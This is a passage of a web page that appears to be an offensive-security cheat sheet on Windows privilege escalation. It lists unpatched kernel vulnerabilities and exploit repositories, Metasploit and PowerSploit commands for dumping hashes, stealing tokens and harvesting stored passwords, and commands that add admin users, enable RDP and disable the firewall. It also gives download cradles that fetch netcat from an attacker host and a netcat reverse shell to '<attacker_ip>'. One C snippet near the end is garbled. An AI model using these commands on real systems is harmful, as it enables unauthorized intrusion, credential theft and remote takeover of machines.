MS14-058     KB3000061    Windows Server 2003, Windows Server 2008, Windows Server 2012, 7, 8 Win32k.sys
MS14-040     KB2975684     Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012
MS14-002     KB2914368     Windows XP, Windows Server 2003
MS13-005     KB2778930    Windows Server 2003, Windows Server 2008, 7, 8,
MS10-092     KB2305420     Windows Server 2008, 7
MS10-015     KB977165     Windows Server 2003, Windows Server 2008, 7, XP
MS14-002     KB2914368    Windows Server 2003, XP
MS15-061     KB3057839    Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012
MS11-080     KB2592799    Windows Server 2003, XP
MS11-062     KB2566454    Windows Server 2003, XP
MS15-076     KB3067505    Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012
MS16-075     KB3164038    Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012
MS15-010     KB3036220    Windows Server 2003, Windows Server 2008, 7, XP
MS11-046     KB2503665    Windows Server 2003, Windows Server 2008, 7, XP
</code></pre><pre tabindex="0"><code>MS11-011 (KB2393802)
MS10-059 (KB982799)
MS10-021 (KB979683)
MS11-080 (KB2592799)
</code></pre><p>Exploits worth looking at: MS11-046</p>
<pre tabindex="0"><code>https://github.com/SecWiki/windows-kernel-exploits
</code></pre><p>Windows version map</p>
<pre tabindex="0"><code>Operating System     Version Number

Windows 1.0                    1.04
Windows 2.0                    2.11
Windows 3.0                    3
Windows NT 3.1                 3.10.528
Windows for Workgroups 3.11    3.11
Windows NT Workstation 3.5     3.5.807
Windows NT Workstation 3.51    3.51.1057
Windows 95                     4.0.950
Windows NT Workstation 4.0     4.0.1381
Windows 98                     4.1.1998
Windows 98 Second Edition      4.1.2222
Windows Me                     4.90.3000
Windows 2000 Professional      5.0.2195
Windows XP                     5.1.2600
Windows Vista                  6.0.6000
Windows 7                      6.1.7600
Windows 8.1                    6.3.9600
Windows 10                     10.0.10240
</code></pre><h3 id="eop-9-automated-tools">EoP 9: Automated tools</h3>
<p>Powersploit</p>
<pre tabindex="0"><code>https://github.com/PowerShellMafia/PowerSploit
Get-GPPPassword
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
</code></pre><p>Metasploit</p>
<pre tabindex="0"><code>post/windows/gather/credentials/gpp
post/windows/gather/enum_unattend
</code></pre><pre tabindex="0"><code>getsystem
getprivs
use priv
hashdump
</code></pre><p>Metasploit incognito</p>
<pre tabindex="0"><code>use incognito
list_tokens -u
list_tokens -g
impersonate_token DOMAIN_NAME\\USERNAME
steal_token PID
drop_token
rev2self
</code></pre><h3 id="useful-commands">Useful commands</h3>
<p>Add a new user</p>
<pre tabindex="0"><code>$ net user test 1234 /add
$ net localgroup administrators test /add
</code></pre><p>Print files contents:</p>
<pre tabindex="0"><code>$ type file
</code></pre><p>Remove file</p>
<pre tabindex="0"><code>$ del /f file
</code></pre><p>Change password for user:</p>
<pre tabindex="0"><code>$ net user &lt;user&gt; &lt;password&gt;
</code></pre><p>List users:</p>
<pre tabindex="0"><code>$ net user
</code></pre><p>Info about a user:</p>
<pre tabindex="0"><code>$ net user &lt;username&gt;
</code></pre><p>Permissions on a folder recursively:</p>
<pre tabindex="0"><code>$ cacls *.* /t /e /g domainname\administrator:f
</code></pre><p>tasklist or wmic process or tasklist /svc</p>
<p>Enable RDP access</p>
<pre tabindex="0"><code>reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
</code></pre><p>Disable firewall</p>
<pre tabindex="0"><code>$ netsh firewall set opmode disable
</code></pre><p>Run exploit</p>
<pre tabindex="0"><code>C:\tmp&gt;powershell -ExecutionPolicy ByPass -command &quot;&amp; { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }&quot;
</code></pre><h3 id="transferring-files">Transferring files</h3>
<p>Paste the following code to get nc in the victim:</p>
<pre tabindex="0"><code>echo open &lt;attacker_ip&gt; 21&gt; ftp.txt
echo USER offsec&gt;&gt; ftp.txt
echo ftp&gt;&gt; ftp.txt
echo bin &gt;&gt; ftp.txt
echo GET nc.exe &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt
ftp -v -n -s:ftp.txt
nc.exe &lt;attacker_ip&gt; 1234 -e cmd.exe
</code></pre><p>Bounce port sanning</p>
<pre tabindex="0"><code>$ nc $ip 21
220 Femitter FTP Server ready.
USER anonymous
331 Password required for anonymous.
PASS foo
230 User anonymous logged in.
PORT 127,0,0,1,0,80
200 Port command successful.
LIST
</code></pre><p>Nice trick to share folders with RDP:</p>
<pre tabindex="0"><code>$ rdesktop (ip) -r disk:share=/home/bayo/store
</code></pre><p>With powershell:</p>
<pre tabindex="0"><code>$ powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')&quot;
</code></pre><p>Paste the following block in a command line to get a web client:</p>
<pre tabindex="0"><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
echo Err.Clear &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
echo http.Send &gt;&gt; wget.vbs
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
echo strData = &quot;&quot; &gt;&gt; wget.vbs
echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
echo Next &gt;&gt; wget.vbs
echo ts.Close &gt;&gt; wget.vbs
</code></pre><p>Run with:</p>
<pre tabindex="0"><code>$ cscript wget.vbs http://&lt;attacker_ip&gt;/nc.exe nc.exe
</code></pre><h3 id="metasploit">Metasploit</h3>
<p>Module to elevate privileges to SYSTEM by creating a service or hijacking existing ones with incorrect permissions</p>
<pre tabindex="0"><code>$ exploit/windows/local/service_permissions
</code></pre><p>Privilege escalation</p>
<pre tabindex="0"><code>getsystem
hashdump
</code></pre><p>From admin to system</p>
<pre tabindex="0"><code>psexec.exe -i -s %SystemRoot%\system32\cmd.exe
</code></pre><h3 id="automated-scripts">Automated scripts.</h3>
<pre tabindex="0"><code>https://github.com/GDSSecurity/Windows-Exploit-Suggester
https://github.com/Jean13/Penetration_Testing/blob/master/Privilege_Escalation/windows-privesc-check2.exe
</code></pre><h3 id="c-code-example">C code Example</h3>
<p>Add user to administrator group</p>
<pre tabindex="0"><code>#include &lt;stdlib.h&gt;
int main ()
{
    int i;
    i = system(&quot;net localgroup administrators theusername /add&quot;);
    return 0;
}
</code></pre><pre tabindex="0"><code>i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
</code></pre><p>Run an arbitrary command:</p>
<pre tabindex="0"><code>echo -e '#include &lt;stdio.h&gt;\n#include &lt;smain () {\nsystem(&quot;C:\\Users\\Administrator\\Desktop\\nc -lvp 4313 -e cmd.exe&quot;);\nreturn(0);\n}'&gt; poc.c
</code></pre>

    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/cheatsheet/blog/crackmapexec/" title="CrackMapExec (a.k.a CME) "> <i class="fa fa-chevron-left"></i><label>CrackMapExec (a.k.a CME) </label></a>
    <a class="nav nav-next" href="/cheatsheet/blog/linux-privilege-escalation/" title="Linux Privilege Escalation" style="margin-right: 0px;"><label>Linux Privilege Escalation</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    
    <div class="tags"> 
      
        <a class="label label-default" href="/cheatsheet/tags/windows">windows</a>
      
        <a class="label label-default" href="/cheatsheet/tags/privilege">privilege</a>
      
        <a class="label label-default" href="/cheatsheet/tags/offensive">offensive</a>
      
    </div>
    

    

    
    <div class="date">
        <i class='fa fa-calendar'></i> Last update on 06/04/2022
    </div>
    

    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/cheatsheet/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
    
        var baseurl = "\/cheatsheet\/";
    
</script>
<script src="/cheatsheet/js/clipboard.min.js"></script>
<script src="/cheatsheet/js/featherlight.min.js"></script>

<script type="text/javascript" src="/cheatsheet/js/lunr.min.js"></script>
<script type="text/javascript" src="/cheatsheet/js/auto-complete.js"></script>
<script type="text/javascript" src="/cheatsheet/js/search.js"></script>
<script src="/cheatsheet/theme-flex/script.js"></script>




<script src="/cheatsheet/js/scripts.min.js"></script>
    

    
    

    
  </body>
</html>